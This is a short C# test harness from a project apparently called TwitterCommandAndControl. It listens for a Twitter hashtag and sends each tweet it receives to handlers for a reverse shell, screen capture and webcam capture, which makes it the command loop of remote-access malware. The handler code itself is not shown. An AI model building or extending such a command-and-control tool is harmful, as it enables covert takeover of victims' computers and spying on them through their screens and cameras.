using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TwitterCommandAndControl.Test
{
    class Program
    {
        static void Main(string[] args)
        {
            var hashTag = "#TwitterCommandAndControl";

            Console.WriteLine("Starting Tracker");

            var tracker = Tracker.New(x => {
                Console.WriteLine(x);
                Task.Run(() =>
                {
                    ReverseShellHandler.Respond(x);
                    ScreenCaptureHandler.Respond(x);
                    WebcamHandler.Respond(x);
                });
            }, 
            track: hashTag, 
            log: Console.Out);
            
            while (!tracker.IsActive) ;
            Console.WriteLine("Tracker Active");

            Messenger.Send(hashTag + " test");
            
            Console.WriteLine("Press Any Key To Exit");

            Console.ReadKey();

            //tracker.Wait();
        }
    }
}
